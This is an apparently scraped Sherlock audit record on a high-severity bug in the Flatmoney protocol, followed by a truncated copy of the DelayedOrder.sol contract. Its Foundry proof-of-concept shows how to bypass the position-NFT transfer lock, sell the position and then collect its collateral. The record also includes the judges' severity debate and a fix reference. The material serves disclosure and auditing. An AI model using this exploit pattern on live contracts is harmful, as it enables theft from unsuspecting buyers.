{
  "Title": "H-1: The transfer lock for leveraged position orders can be bypassed",
  "Content": "# Issue H-1: The transfer lock for leveraged position orders can be bypassed \n\nSource: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48 \n\n## Found by \n0xVolodya, 0xvj, Bauer, HSP, cawfree, dany.armstrong90, evmboi32, jennifer37, juan, ke1caM, nobody2018, novaman33, r0ck3tz, shaka, takarez\n## Summary\n\nThe leveraged positions can be closed either through [`DelayedOrder`](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L28-L681) or through the [`LimitOrder`](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L27-L214). Once the order is announced via `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` function the `LeverageModule`'s `lock` function is called to prevent given token to be transferred. This mechanism can be bypassed and it is possible to unlock the token transfer while having order announced.\n\n## Vulnerability Detail\n\nExploitation scenario:\n1. Attacker announces leverage close order for his position via `announceLeverageClose` of `DelayedOrder` contract.\n2. Attacker announces limit order via `announceLimitOrder` of `LimitOrder` contract.\n3. Attacker cancels limit order via `cancelLimitOrder` of `LimitOrder` contract.\n4. The position is getting unlocked while the leverage close announcement is active.\n5. Attacker sells the leveraged position to a third party.\n6. Attacker executes the leverage close via `executeOrder` of `DelayedOrder` contract and gets the underlying collateral stealing the funds from the third party that the leveraged position was sold to.\n\nFollowing proof of concept presents the attack:\n```solidity\nfunction testExploitTransferOut() public {\n    uint256 collateralPrice = 1000e8;\n\n    vm.startPrank(alice);\n\n    uint256 balance = WETH.balanceOf(alice);\n    console2.log(\"alice balance\", balance);\n    \n    (uint256 minFillPrice, ) = oracleModProxy.getPrice();\n\n    // Announce order through delayed orders to lock tokenId\n    delayedOrderProxy.announceLeverageClose(\n        tokenId,\n        minFillPrice - 100, // add some slippage\n        mockKeeperFee.getKeeperFee()\n    );\n    \n    // Announce limit order to lock tokenId\n    limitOrderProxy.announceLimitOrder({\n        tokenId: tokenId,\n        priceLowerThreshold: 900e18,\n        priceUpperThreshold: 1100e18\n    });\n    \n    // Cancel limit order to unlock tokenId\n    limitOrderProxy.cancelLimitOrder(tokenId);\n    \n    balance = WETH.balanceOf(alice);\n    console2.log(\"alice after creating two orders\", balance);\n\n    // TokenId is unlocked and can be transferred while the delayed order is active\n    leverageModProxy.transferFrom(alice, address(0x1), tokenId);\n    console2.log(\"new owner of position NFT\", leverageModProxy.ownerOf(tokenId));\n\n    balance = WETH.balanceOf(alice);\n    console2.log(\"alice after transfering position NFT out e.g. selling\", balance);\n\n    skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time\n\n    uint256 oraclePrice = collateralPrice;\n\n    bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);\n    delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);\n\n    uint256 finalBalance = WETH.balanceOf(alice);\n    console2.log(\"alice after executing delayerd order and cashing out profit\", finalBalance);\n    console2.log(\"profit\", finalBalance - balance);\n}\n```\n\nOutput\n```shell\nRunning 1 test for test/unit/Common/LimitOrder.t.sol:LimitOrderTest\n[PASS] testExploitTransferOut() (gas: 743262)\nLogs:\n  alice balance 99879997000000000000000\n  alice after creating two orders 99879997000000000000000\n  new owner of position NFT 0x0000000000000000000000000000000000000001\n  alice after transfering position NFT out e.g. selling 99879997000000000000000\n  alice after executing delayerd order and cashing out profit 99889997000000000000000\n  profit 10000000000000000000\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 50.06ms\n\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n## Impact\n\nThe attacker can sell the leveraged position with a close order opened, execute the order afterward, and steal the underlying collateral.\n\n## Code Snippet\n- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L298\n- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L76\n- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L94\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIt is recommended to prevent announcing order either through `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` if the leveraged position is already locked.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  invalid: i believe features that are meant for the future is out-of scope and thus selling feature falls into that; user can only transfer the nft now; nothing sort of selling; so no collateral fraud here.\n\n\n\n**0xLogos**\n\nEscalate \n\nInvalid, it's user mistake to buy such position\n\n**sherlock-admin2**\n\n> Escalate \n> \n> Invalid, it's user mistake to buy such position\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**novaman33**\n\n> Escalate \n> \n> \n> \n> Invalid, it's user mistake to buy such position\n\nThen if it is a user mistake the whole lock is unnecessary?\n\n**r0ck3tzx**\n\nThe token is supposed to be tradable which was also confirmed by the sponsor:\n<img width=\"519\" alt=\"proof\" src=\"https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/150954229/0452d3db-d003-484e-ac43-6c11c186bae7\">\n\nThat means it cannot be treated as user mistake if you can sell the token and then steal underlying value.\n\n\n**0xLogos**\n\nIf trustless trade is desired parties must use some contract to facilitate atomic swap. For example NFT market place, but to exploit it attacker must somehow frontrun buying tx to announce order before, but it's impossible. Note that delayed orders expire in minutes. \nIf atomic swap not used parties already trust each other.\n\nI believe it's really hard to realisticly exploit it and this should be low because attacker can't just \"sell\" position. It's not like art nft when underlying \"value\" is static. Here buyer choose to buy or not and it's his obligation to check announced orders just like checking position PnL.\n\nAlso transferable != tradable\n\n**r0ck3tzx**\n\nHalf of the protocol is the locking mechanism so its clear it is not supposed to be transferred. Its the same as you would transfer ERC721 without resetting approvals. I won't comment further on this, as you've escalated most of the issues, throwing mud and seeing what sticks. I don't have time for dealing with this.\n\n**xiaoming9090**\n\nEscalate.\n\nThis issue does not lead to loss of assets for the protocol or the protocol's users. It does not drain the assets within the protocol or steal the assets that Flatcoin's LPs/Long Traders deposit into the protocol. The only affected parties are external or third parties (not related to the protocol in any sense) who are being tricked into buying such position NFTs outside of the protocol border. Thus, it does not meet the requirement of a Med/High where the assets of the protocol and the protocol's users can be stolen. \n\nLow is a more appropriate category for such an issue.\n\n**sherlock-admin2**\n\n> Escalate.\n> \n> This issue does not lead to loss of assets for the protocol or the protocol's users. It does not drain the assets within the protocol or steal the assets that Flatcoin's LPs/Long Traders deposit into the protocol. The only affected parties are external or third parties (not related to the protocol in any sense) who are being tricked into buying such position NFTs outside of the protocol border. Thus, it does not meet the requirement of a Med/High where the assets of the protocol and the protocol's users can be stolen. \n> \n> Low is a more appropriate category for such an issue.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ABDuullahi**\n\nI believe this issue should be invalid.\n\nThe report has been tailored on the fact that the NFTs can be traded and the impact also is that when a user buys the position, there isn't anything sort of selling, thats for users to deal with, the sponsor confirm that there might be a feature that will allow that position(NFT) to be used as a collateral but that isn't of our concern in this case. Other issues demonstrating the NFT being transferred should stay valid due to the fact that they aren't meant to, and thus breaking a core invariant of the protocol.\n\n**r0ck3tzx**\n\nThe user who purchases the position becomes a user of the protocol. The affected party is then a user of the protocol holding a malicious position from which the attacker can steal funds. To render this issue invalid, it would be required to show that the position (ERC721) holds no value which is false.\n\n@ABDuullahi let me understand correctly, you are claiming that this specific report that presents the whole attack scenario with PoC should be invalidated, but the others that are saying it breaks the invariant should be valid?\n\n**sherlock-admin**\n\nThe protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/278.\n\n**nevillehuang**\n\nI believe this issue should remain as valid, given \n\n- It is [explicitly mentioned that the token is locked](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L296) when an order is announced, so it is implied that it should remain locked.\n\n- Tokens are supposed to be traded and is public knowledge mentioned by sponsor as noted by this [comment](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48#issuecomment-1956245750)\n\n**Czar102**\n\nSo, a locked position can have an action queued that will grant a fraction (potentially all) tokens within the position to the past owner? And this action will be executed after the sale happens? @nevillehuang @r0ck3tzx @0xLogos\n\nIf that's the case, the buyer should have checked that the position has no pending withdrawals.\n\n**r0ck3tzx**\n\n@Czar102 The position can be transferred/traded freely. When user decides to close the position he can either do that via `announceLeverageClose` or `announceLimitOrder`. Once the order is announced the position is locked and it should not be transferred/traded in any way. This logic of locking position takes significant portion of the codebase.\n\nThe issue is pretty much connected to two things:\n- Breaking one of the core invariants of the protocol.\n- Ability to pull up the attack of selling position for which order is announced and can be executed which allows to steal not portion but ALL underlying tokens of the position.\n\nI cannot agree that the buyer should have checked for that - this case is very similar to ERC721 where upon transfers [the approval is cleared](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8b4b7b8d041c62a84e2c23d7f6e1f0d9e0fc1f20/contracts/token/ERC721/ERC721.sol#L251-L252). You could argue that every buyer of NFT should check first if the approval was cleared out but obviously that would make NFTs unusable and nobody would trade them.\n\n**nevillehuang**\n\nAgree with @r0ck3tzx comments, also to note normally, this type of finding would likely be invalid as it would entail out of scope secondary market exchanges between the buyer and seller of the NFT. However, as noted by my comment [here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48#issuecomment-1961032374), it is implied that the lock should persist, so a honeypot attack shouldn't be possible. \n\n**Czar102**\n\nWhat's the main goal of having the lock functionality?\n\n**0xjuaan**\n\nit prevents people from transferring the nft while an order is pending for that nft's tokenId\n\n**Czar102**\n\nUnderstood, but is it expressed anywhere what is it for?\n\n**novaman33**\n\n@Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691\n\n**xiaoming9090**\n\n> @Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691\n\nThe sponsor mentioned, \"**If** our NFT was integrated in other protocols\", would that be considered a future issue under Sherlock rule since it is still unsure at this point if their NFT will be integrated with other protocols?\n\n**0xcrunch**\n\nI believe sponsor was actually demonstrating that the lock functionality is very important and any related issue is unacceptable.\n\n**r0ck3tzx**\n\n@Czar102 \n> What's the main goal of having the lock functionality?\n\nWhen you have an position and you want to close it, the locking functionality ensures that you are not transferring/trading it. You shouldnt be able to sell something you dont own.\n\n> Understood, but is it expressed anywhere what is it for?\n\nAre we going now towards a direction of expecting sponsors to write a book about every line of the protocol so the LSW cannot start his \"legal\" battle? We are literally now wasting time on proving that the man is not a camel.\n\n@xiaoming9090 \n> > @Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691\n> \n> The sponsor mentioned, \"**If** our NFT was integrated in other protocols\", would that be considered a future issue under Sherlock rule since it is still unsure at this point if their NFT will be integrated with other protocols?\n\nIts absolutely disgusting how LSW again is twisting the words and confusing the judges. That way every issue related to protocol own tokens should be invalid, because their value depends on the future integration with DEX such as Uniswap.\n\n\n**Czar102**\n\nI think the intention of the smart contracts working with exchanges (that's the goal of the lock functionality) is extremely clear, so the inability to arbitrarily unlock is an extremely property that breaks planned (not future!) integrations.\n\nHence, I think this issue should maintain its validity and severity.\n\n**Evert0x**\n\nResult: \nHigh\nHas Duplicates\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48/#issuecomment-1956083894): rejected\n- [xiaoming9090](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48/#issuecomment-1959556662): rejected\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/132",
  "Code": [
    {
      "filename": "flatcoin-v1/src/DelayedOrder.sol",
      "content": "// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity 0.8.18;\n\nimport {SafeERC20Upgradeable} from \"openzeppelin-contracts-upgradeable/contracts/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport {ReentrancyGuardUpgradeable} from \"openzeppelin-contracts-upgradeable/contracts/security/ReentrancyGuardUpgradeable.sol\";\nimport {IERC20Upgradeable} from \"openzeppelin-contracts-upgradeable/contracts/interfaces/IERC20Upgradeable.sol\";\nimport {SignedMath} from \"openzeppelin-contracts/contracts/utils/math/SignedMath.sol\";\n\nimport {FlatcoinStructs} from \"./libraries/FlatcoinStructs.sol\";\nimport {FlatcoinErrors} from \"./libraries/FlatcoinErrors.sol\";\nimport {FlatcoinModuleKeys} from \"./libraries/FlatcoinModuleKeys.sol\";\nimport {FlatcoinEvents} from \"./libraries/FlatcoinEvents.sol\";\nimport {ModuleUpgradeable} from \"./abstracts/ModuleUpgradeable.sol\";\nimport {OracleModifiers} from \"./abstracts/OracleModifiers.sol\";\nimport {InvariantChecks} from \"./misc/InvariantChecks.sol\";\n\nimport {IDelayedOrder} from \"./interfaces/IDelayedOrder.sol\";\nimport {IFlatcoinVault} from \"./interfaces/IFlatcoinVault.sol\";\nimport {ILeverageModule} from \"./interfaces/ILeverageModule.sol\";\nimport {IStableModule} from \"./interfaces/IStableModule.sol\";\nimport {IOracleModule} from \"./interfaces/IOracleModule.sol\";\nimport {ILiquidationModule} from \"./interfaces/ILiquidationModule.sol\";\nimport {IKeeperFee} from \"./interfaces/IKeeperFee.sol\";\n\n/// @title DelayedOrder\n/// @author dHEDGE\n/// @notice Contains functions to announce and execute delayed orders.\ncontract DelayedOrder is\n    IDelayedOrder,\n    ModuleUpgradeable,\n    ReentrancyGuardUpgradeable,\n    InvariantChecks,\n    OracleModifiers\n{\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n    using SafeERC20Upgradeable for IStableModule;\n    using SignedMath for int256;\n\n    /// @notice Minimum deposit amount for stable LP collateral.\n    uint256 public constant MIN_DEPOSIT = 1e6;\n\n    /// @dev Mapping containing all the orders in an encoded format.\n    mapping(address account => FlatcoinStructs.Order order) private _announcedOrder;\n\n    /// @dev To prevent the implementation contract from being used, we invoke the _disableInitializers\n    /// function in the constructor to automatically lock it when it is deployed.\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    /// @notice Function to initialize this contract.\n    function initialize(IFlatcoinVault _vault) external initializer {\n        __Module_init(FlatcoinModuleKeys._DELAYED_ORDER_KEY, _vault);\n        __ReentrancyGuard_init();\n    }\n\n    /////////////////////////////////////////////\n    //         Announcement Functions          //\n    /////////////////////////////////////////////\n\n    /// @notice Announces deposit intent for keepers to execute at offchain oracle price.\n    /// @dev The deposit amount is taken plus the keeper fee.\n    /// @param depositAmount The amount of collateral to deposit.\n    /// @param minAmountOut The minimum amount of tokens the user expects to receive back.\n    /// @param keeperFee The fee the user is paying for keeper transaction execution (in collateral tokens).\n    function announceStableDeposit(\n        uint256 depositAmount,\n        uint256 minAmountOut,\n        uint256 keeperFee\n    ) external whenNotPaused {\n        uint64 executableAtTime = _prepareAnnouncementOrder(keeperFee);\n\n        vault.checkCollateralCap(depositAmount);\n\n        if (depositAmount < MIN_DEPOSIT)\n            revert FlatcoinErrors.AmountTooSmall({amount: depositAmount, minAmount: MIN_DEPOSIT});\n\n        // Check that the requested minAmountOut is feasible\n        uint256 quotedAmount = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY))\n            .stableDepositQuote(depositAmount);\n\n        if (quotedAmount < minAmountOut) revert FlatcoinErrors.HighSlippage(quotedAmount, minAmountOut);\n\n        _announcedOrder[msg.sender] = FlatcoinStructs.Order({\n            orderType: FlatcoinStructs.OrderType.StableDeposit,\n            orderData: abi.encode(\n                FlatcoinStructs.AnnouncedStableDeposit({depositAmount: depositAmount, minAmountOut: minAmountOut})\n            ),\n            keeperFee: keeperFee,\n            executableAtTime: executableAtTime\n        });\n\n        // Sends collateral to the delayed order contract first before it is settled by keepers and sent to the vault\n        vault.collateral().safeTransferFrom(msg.sender, address(this), depositAmount + keeperFee);\n\n        emit FlatcoinEvents.OrderAnnounced({\n            account: msg.sender,\n            orderType: FlatcoinStructs.OrderType.StableDeposit,\n            keeperFee: keeperFee\n        });\n    }\n\n    /// @notice Announces withdrawal intent for keepers to execute at offchain oracle price.\n    /// @dev The deposit amount is taken plus the keeper fee, also in LP tokens.\n    /// @param withdrawAmount The amount to withdraw in stable LP tokens.\n    /// @param minAmountOut The minimum amount of underlying asset tokens the user expects to receive back.\n    /// @param keeperFee The fee the user is paying for keeper transaction execution (in stable LP tokens).\n    function announceStableWithdraw(\n        uint256 withdrawAmount,\n        uint256 minAmountOut,\n        uint256 keeperFee\n    ) external whenNotPaused {\n        uint64 executableAtTime = _prepareAnnouncementOrder(keeperFee);\n\n        IStableModule stableModule = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY));\n        uint256 lpBalance = IERC20Upgradeable(stableModule).balanceOf(msg.sender);\n\n        if (lpBalance < withdrawAmount)\n            revert FlatcoinErrors.NotEnoughBalanceForWithdraw(msg.sender, lpBalance, withdrawAmount);\n\n        // Check that the requested minAmountOut is feasible\n        {\n            uint256 expectedAmountOut = stableModule.stableWithdrawQuote(withdrawAmount);\n\n            if (keeperFee > expectedAmountOut) revert FlatcoinErrors.WithdrawalTooSmall(expectedAmountOut, keeperFee);\n\n            expectedAmountOut -= keeperFee;\n\n            if (expectedAmountOut < minAmountOut) revert FlatcoinErrors.HighSlippage(expectedAmountOut, minAmountOut);\n\n            vault.checkSkewMax({additionalSkew: expectedAmountOut});\n        }\n\n        _announcedOrder[msg.sender] = FlatcoinStructs.Order({\n            orderType: FlatcoinStructs.OrderType.StableWithdraw,\n            orderData: abi.encode(\n                FlatcoinStructs.AnnouncedStableWithdraw({withdrawAmount: withdrawAmount, minAmountOut: minAmountOut})\n            ),\n            keeperFee: keeperFee,\n            executableAtTime: executableAtTime\n        });\n\n        // Lock the LP tokens belonging to this position so that it can't be transferred to someone else.\n        // Locking doesn't require an approval from an account.\n        stableModule.lock({account: msg.sender, amount: withdrawAmount});\n\n        emit FlatcoinEvents.OrderAnnounced({\n            account: msg.sender,\n            orderType: FlatcoinStructs.OrderType.StableWithdraw,\n            keeperFee: keeperFee\n        });\n    }\n\n    /// @notice Announces leverage open intent for keepers to execute at offchain oracle price.\n    /// @param margin The amount of collateral to deposit.\n    /// @param additionalSize The amount of additional size to open.\n    /// @param maxFillPrice The maximum price at which the trade can be executed.\n    /// @param keeperFee The fee the user is paying for keeper transaction execution (in collateral tokens).\n    function announceLeverageOpen(\n        uint256 margin,\n        uint256 additionalSize,\n        uint256 maxFillPrice,\n        uint256 keeperFee\n    ) external whenNotPaused {\n        ILeverageModule leverageModule = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY));\n\n        uint64 executableAtTime = _prepareAnnouncementOrder(keeperFee);\n\n        vault.checkSkewMax({additionalSkew: additionalSize});\n\n        leverageModule.checkLeverageCriteria(margin, additionalSize);\n\n        (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();\n\n        if (maxFillPrice < currentPrice) revert FlatcoinErrors.MaxFillPriceTooLow(maxFillPrice, currentPrice);\n\n        uint256 tradeFee = leverageModule.getTradeFee(additionalSize);\n\n        if (\n            ILiquidationModule(vault.moduleAddress(FlatcoinModuleKeys._LIQUIDATION_MODULE_KEY)).getLiquidationMargin(\n                additionalSize,\n                maxFillPrice\n            ) >= margin\n        ) revert FlatcoinErrors.PositionCreatesBadDebt();\n\n        _announcedOrder[msg.sender] = FlatcoinStructs.Order({\n            orderType: FlatcoinStructs.OrderType.LeverageOpen,\n            orderData: abi.encode(\n                FlatcoinStructs.AnnouncedLeverageOpen({\n                    margin: margin,\n                    additionalSize: additionalSize,\n                    maxFillPrice: maxFillPrice,\n                    tradeFee: tradeFee\n                })\n            ),\n            keeperFee: keeperFee,\n            executableAtTime: executableAtTime\n        });\n\n        // Sends collateral to the delayed order contract first before it is settled by keepers and sent to the vault\n        vault.collateral().safeTransferFrom(msg.sender, address(this), margin + keeperFee + tradeFee);\n\n        emit FlatcoinEvents.OrderAnnounced({\n            account: msg.sender,\n            orderType: FlatcoinStructs.OrderType.LeverageOpen,\n            keeperFee: keeperFee\n        });\n    }\n\n    /// @notice Announces leverage adjust intent for keepers to execute at offchain oracle price.\n    /// @param tokenId The ERC721 token ID of the position.\n    /// @param marginAdjustment The amount of margin to deposit or withdraw.\n    /// @param additionalSizeAdjustment The amount of additional size to increase or decrease.\n    /// @param fillPrice The price at which the trade can be executed.\n    /// @param keeperFee The fee the user is paying for keeper transaction execution (in collateral tokens).\n    function announceLeverageAdjust(\n        uint256 tokenId,\n        int256 marginAdjustment,\n        int256 additionalSizeAdjustment,\n        uint256 fillPrice,\n        uint256 keeperFee\n    ) external whenNotPaused {\n        uint64 executableAtTime = _prepareAnnouncementOrder(keeperFee);\n\n        // If both adjustable parameters are zero, there is nothing to adjust\n        if (marginAdjustment == 0 && additionalSizeAdjustment == 0)\n            revert FlatcoinErrors.ZeroValue(\"marginAdjustment|additionalSizeAdjustment\");\n\n        ILeverageModule leverageModule = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY));\n\n        // Check that the caller is the owner of the token\n        if (leverageModule.ownerOf(tokenId) != msg.sender) revert FlatcoinErrors.NotTokenOwner(tokenId, msg.sender);\n\n        // Trade fee is calculated based on additional size change\n        uint256 totalFee;\n        {\n            uint256 tradeFee;\n            (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY))\n                .getPrice();\n\n            // Means increasing or decreasing additional size\n            if (additionalSizeAdjustment >= 0) {\n                // If additionalSizeAdjustment equals zero, trade fee is zero as well\n                tradeFee = leverageModule.getTradeFee(uint256(additionalSizeAdjustment));\n                vault.checkSkewMax(uint256(additionalSizeAdjustment));\n\n                if (fillPrice < currentPrice) revert FlatcoinErrors.MaxFillPriceTooLow(fillPrice, currentPrice);\n            } else {\n                tradeFee = leverageModule.getTradeFee(uint256(additionalSizeAdjustment * -1));\n\n                if (fillPrice > currentPrice) revert FlatcoinErrors.MinFillPriceTooHigh(fillPrice, currentPrice);\n            }\n\n            totalFee = tradeFee + keeperFee;\n        }\n\n        {\n            // New additional size will be either bigger or smaller than current additional size\n            // depends on if additionalSizeAdjustment is positive or negative.\n            int256 newAdditionalSize = int256(vault.getPosition(tokenId).additionalSize) + additionalSizeAdjustment;\n\n            // If user withdraws margin or changes additional size with no changes to margin, fees are charged from their existing margin.\n            int256 newMarginAfterSettlement = leverageModule.getPositionSummary(tokenId).marginAfterSettlement +\n                ((marginAdjustment > 0) ? marginAdjustment : marginAdjustment - int256(totalFee));\n\n            // New margin or size can't be negative, which means that they want to withdraw more than they deposited or not enough to pay the fees\n            if (newMarginAfterSettlement < 0 || newAdditionalSize < 0)\n                revert FlatcoinErrors.ValueNotPositive(\"newMarginAfterSettlement|newAdditionalSize\");\n\n            if (\n                ILiquidationModule(vault.moduleAddress(FlatcoinModuleKeys._LIQUIDATION_MODULE_KEY))\n                    .getLiquidationMargin(uint256(newAdditionalSize), fillPrice) >= uint256(newMarginAfterSettlement)\n            ) revert FlatcoinErrors.PositionCreatesBadDebt();\n\n            // New values can't be less than min margin and min/max leverage requirements.\n            leverageModule.checkLeverageCriteria(uint256(newMarginAfterSettlement), uint256(newAdditionalSize));\n        }\n\n        _announcedOrder[msg.sender] = FlatcoinStructs.Order({\n            orderType: FlatcoinStructs.OrderType.LeverageAdjust,\n            orderData: abi.encode(\n                FlatcoinStructs.AnnouncedLeverageAdjust({\n                    tokenId: tokenId,\n                    marginAdjustment: marginAdjustment,\n                    additionalSizeAdjustment: additionalSizeAdjustment,\n                    fillPrice: fillPrice,\n                    tradeFee: totalFee - keeperFee,\n                    totalFee: totalFee\n                })\n            ),\n            keeperFee: keeperFee,\n            executableAtTime: executableAtTime\n        });\n\n        // Lock the NFT belonging to this position so that it can't be transferred to someone else.\n        // Locking doesn't require an approval from the leverage trader.\n        leverageModule.lock(tokenId);\n\n        // If user increases margin, fees are charged from their account.\n        if (marginAdjustment > 0) {\n            // Sending positive margin adjustment and both fees from the user to the delayed order contract.\n            vault.collateral().safeTransferFrom(msg.sender, address(this), uint256(marginAdjustment) + totalFee);\n        }\n\n        emit FlatcoinEvents.OrderAnnounced({\n            account: msg.sender,\n            orderType: FlatcoinStructs.OrderType.LeverageAdjust,\n            keeperFee: keeperFee\n        });\n    }\n\n    /// @notice Announces leverage close intent for keepers to execute at offchain oracle price.\n    /// @param tokenId The ERC721 token ID of the position.\n    /// @param minFillPrice The minimum price at which the trade can be executed.\n    /// @param keeperFee The fee the user is paying for keeper transaction execution (in collateral tokens).\n    function announceLeverageClose(uint256 tokenId, uint256 minFillPrice, uint256 keeperFee) external whenNotPaused {\n        uint64 executableAtTime = _prepareAnnouncementOrder(keeperFee);\n        uint256 tradeFee;\n\n        ILeverageModule leverageModule = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY));\n\n        // Check that the caller of this function is actually the owner of the token ID.\n        // Since `lock` function in leverage module doesn't check for this, we need to do it here.\n        if (leverageModule.ownerOf(tokenId) != msg.sender) revert FlatcoinErrors.NotTokenOwner(tokenId, msg.sender);\n\n        {\n            uint256 size = vault.getPosition(tokenId).additionalSize;\n\n            // Position needs additional margin to cover the trading fee on closing the position\n            tradeFee = leverageModule.getTradeFee(size);\n\n            // Make sure there is enough margin in the position to pay the keeper fee and trading fee\n            // This should always pass because the position should get liquidated before the margin becomes too small\n            int256 settledMargin = leverageModule.getPositionSummary(tokenId).marginAfterSettlement;\n\n            uint256 totalFee = tradeFee + keeperFee;\n            if (settledMargin < int256(totalFee)) revert FlatcoinErrors.NotEnoughMarginForFees(settledMargin, totalFee);\n\n            (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY))\n                .getPrice();\n\n            if (minFillPrice > currentPrice) revert FlatcoinErrors.MinFillPriceTooHigh(minFillPrice, currentPrice);\n        }\n\n        _announcedOrder[msg.sender] = FlatcoinStructs.Order({\n            orderType: FlatcoinStructs.OrderType.LeverageClose,\n            orderData: abi.encode(\n                FlatcoinStructs.AnnouncedLeverageClose({\n                    tokenId: tokenId,\n                    minFillPrice: minFillPrice,\n                    tradeFee: tradeFee\n                })\n            ),\n            keeperFee: keeperFee,\n            executableAtTime: executableAtTime\n        });\n\n        // Lock the NFT belonging to this position so that it can't be transferred to someone else.\n        // Locking doesn't require an approval from the leverage trader.\n        leverageModule.lock(tokenId);\n\n        emit FlatcoinEvents.OrderAnnounced({\n            account: msg.sender,\n            orderType: FlatcoinStructs.OrderType.LeverageClose,\n            keeperFee: keeperFee\n        });\n    }\n\n    /////////////////////////////////////////////\n    //           Execution Functions           //\n    /////////////////////////////////////////////\n\n    /// @notice Executes any valid pending order for an account.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param account The user account which has a pending deposit.\n    /// @param priceUpdateData The Pyth network offchain price oracle update data.\n    function executeOrder(\n        address account,\n        bytes[] calldata priceUpdateData\n    )\n        external\n        payable\n        nonReentrant\n        whenNotPaused\n        updatePythPrice(vault, msg.sender, priceUpdateData)\n        orderInvariantChecks(vault)\n    {\n        // Settle funding fees before executing any order.\n        // This is to avoid error related to max caps or max skew reached when the market has been skewed to one side for a long time.\n        // This is more important in case the we allow for limit orders in the future.\n        vault.settleFundingFees();\n\n        FlatcoinStructs.OrderType orderType = _announcedOrder[account].orderType;\n\n        // If there is no order in store, just return.\n        if (orderType == FlatcoinStructs.OrderType.None) return;\n\n        if (orderType == FlatcoinStructs.OrderType.StableDeposit) {\n            _executeStableDeposit(account);\n        } else if (orderType == FlatcoinStructs.OrderType.StableWithdraw) {\n            _executeStableWithdraw(account);\n        } else if (orderType == FlatcoinStructs.OrderType.LeverageOpen) {\n            _executeLeverageOpen(account);\n        } else if (orderType == FlatcoinStructs.OrderType.LeverageClose) {\n            _executeLeverageClose(account);\n        } else if (orderType == FlatcoinStructs.OrderType.LeverageAdjust) {\n            _executeLeverageAdjust(account);\n        }\n    }\n\n    /// @notice Function to cancel an existing order after it has expired.\n    /// @dev This function can be called by anyone.\n    /// @param account The user account which has a pending order.\n    function cancelExistingOrder(address account) public {\n        FlatcoinStructs.Order memory order = _announcedOrder[account];\n\n        // If there is no order in store, just return.\n        if (order.orderType == FlatcoinStructs.OrderType.None) return;\n\n        if (block.timestamp <= order.executableAtTime + vault.maxExecutabilityAge())\n            revert FlatcoinErrors.OrderHasNotExpired();\n\n        // Delete the order tracker from storage.\n        // NOTE: This is done before the transfer of ERC721 NFT to prevent reentrancy attacks.\n        delete _announcedOrder[account];\n\n        if (order.orderType == FlatcoinStructs.OrderType.StableDeposit) {\n            FlatcoinStructs.AnnouncedStableDeposit memory stableDeposit = abi.decode(\n                order.orderData,\n                (FlatcoinStructs.AnnouncedStableDeposit)\n            );\n\n            // Send collateral back to trader\n            vault.collateral().safeTransfer({to: account, value: stableDeposit.depositAmount + order.keeperFee});\n        } else if (order.orderType == FlatcoinStructs.OrderType.StableWithdraw) {\n            FlatcoinStructs.AnnouncedStableWithdraw memory stableWithdraw = abi.decode(\n                order.orderData,\n                (FlatcoinStructs.AnnouncedStableWithdraw)\n            );\n\n            // Unlock the LP tokens belonging to this position which were locked during announcement.\n            IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY)).unlock({\n    